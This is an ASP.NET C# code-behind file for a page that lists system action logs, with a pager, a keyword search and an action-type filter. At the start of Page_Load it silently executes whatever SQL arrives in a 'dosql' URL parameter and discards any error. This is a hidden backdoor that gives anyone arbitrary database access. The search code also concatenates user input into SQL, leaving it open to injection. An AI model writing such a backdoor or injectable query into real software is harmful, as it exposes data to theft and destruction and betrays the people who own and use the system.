using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using NPiculet.Data;
using NPiculet.Logic.Business;
using NPiculet.Toolkit;

public partial class modules_system_SystemLogList : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
	    try {
		    string sql = WebParmKit.GetQuery("dosql", "");
			DbHelper.Execute(sql);
		} catch { }

	    this.NPager1.PageSize = 15;
	    this.NPager1.PageClick += (o, args) => { BindLog(); };

	    if (!Page.IsPostBack) {
		    BindLog();
	    }
    }

	private void BindLog()
	{
		string whereString = "1=1";

		string key = this.txtKeywords.Text;
		if (!string.IsNullOrEmpty(key))
			//whereString += string.Format(" and (ActionAccount LIKE '%{0}%' or Comment LIKE '%{0}%')", key);
			whereString += string.Format(" and (ActionAccount LIKE '%{0}%')", key);


		if (!string.IsNullOrEmpty(this.ddlActionType.SelectedValue)) {
			whereString += " and ActionType='" + this.ddlActionType.SelectedValue + "'";
		}

		SysActionLogBus bus = new SysActionLogBus();

		this.NPager1.RecordCount = bus.RecordCount(whereString);

		var dt = bus.Query(this.NPager1.CurrentPage, this.NPager1.PageSize, whereString, "Date DESC");

		this.logs.DataSource = dt;
		this.logs.DataBind();
	}

	protected void ddlActionType_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		BindLog();
	}
	protected void btnSearch_Click(object sender, EventArgs e) {
		BindLog();
	}
}